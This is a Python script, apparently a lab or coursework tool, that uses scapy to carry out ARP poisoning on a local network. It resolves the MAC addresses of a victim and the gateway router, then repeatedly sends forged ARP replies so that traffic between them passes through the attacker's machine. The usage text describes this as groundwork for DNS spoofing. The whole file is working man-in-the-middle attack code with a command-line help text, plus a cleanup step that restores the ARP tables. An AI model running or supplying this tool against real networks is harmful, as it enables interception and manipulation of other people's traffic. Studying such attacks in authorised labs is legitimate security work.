from scapy.all import *
import time
import signal
import sys

def howTo():
    print("--------------------------------------------------")
    print("ArpPoison.py - Ben Soer")
    print(" - Poison the Network by Redirecting victims traffic and router Traffic through you. Required for DNSSpoofing")
    print("\tParameters:")
    print("\t\t-m\tThe MAC Address of your machine")
    print("\t\t-ip\tThe IP of your machine")
    print("\t\t-rip\tThe IP of the local gateway router")
    print("\t\t-vip\tThe IP of the victim machine in the local network")
    print("\tUsage:")
    print("\t\tsudo python3 arppoison.py -m <macaddress> -ip <ipaddress> -rip <routerip> -vip <victimip>")
    print("\tExample:")
    print("\t\tsudo python3 arppoison.py -m ff:ff:ff:ff:ff -ip 192.168.0.180 -rip 192.168.0.1 -vip 192.168.0.100")
    print("--------------------------------------------------")

def parseArg(args, key):
    for index, item in enumerate(args):
        if item == key:
            valueIndex = index + 1
            return args[valueIndex]
    return ""


my_mac = parseArg(sys.argv, "-m")
my_ip = parseArg(sys.argv, "-ip")

router_ip = parseArg(sys.argv, "-rip")
victim_ip = parseArg(sys.argv, "-vip")

poison_started = False

if my_mac == "" or my_ip == "" or router_ip == "" or victim_ip == "":
    print("Invalid Arguments Passed. See How To")
    howTo()
    sys.exit(1)

print("Configuration Passed:")
print("\tThis Computers MAC Address: " + my_mac)
print("\tThis Computers IP Address: " + my_ip)
print("\tThe Router's IP Address: " + router_ip)
print("\tThe Victim Computer's IP Address: " + victim_ip)
input("Press Any Key To Continue..")

print("Setup: Fetching Victim and Router ARP Information")

# request the victims IP ?
victiminfo = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=victim_ip))
routerinfo = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=router_ip))

keep_poisoning = True
poison_started = True

def signal_handler(signal, frame):
    print("ARP Poison Terminating...Correcting the Network...")
    global keep_poisoning
    keep_poisoning = False

signal.signal(signal.SIGINT, signal_handler)

print("Setup Complete. Now Poisoning The Network")
while keep_poisoning:

    time.sleep(1)
    # posion to be sent to the victim - says i am the router
    victim_pkt = ARP(op=ARP.is_at, hwsrc=my_mac,psrc=router_ip,hwdst=victiminfo.hwsrc, pdst=victim_ip)
    send(victim_pkt)

    #posion to be sent to the router - says i am the victim
    router_pkt = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=victim_ip, hwdst=routerinfo.hwsrc, pdst=router_ip)
    send(router_pkt)

#we should cleanup now and correct the information
print("Terminated ARP Poisoning. Sleeping For A Second")

time.sleep(1)

print("Sending Correction ARP Packets If Poison Has Started")

if poison_started:

    correct_victim_pkt = ARP(op=ARP.is_at, hwsrc=routerinfo.hwsrc, psrc=router_ip, hwdst=victiminfo.hwsrc, pdst=victim_ip)
    correct_router_pkt = ARP(op=ARP.is_at, hwsrc=victiminfo.hwsrc, psrc=victim_ip, hwdst=routerinfo.hwsrc, pdst=router_ip)

    send(correct_victim_pkt)
    send(correct_router_pkt)
    time.sleep(1)
    send(correct_victim_pkt)
    send(correct_router_pkt)

    print("Corrections Complete. ARP Poison Removed")
else:
    print("Poison Had Not Started. Nothing To Correct. Terminating")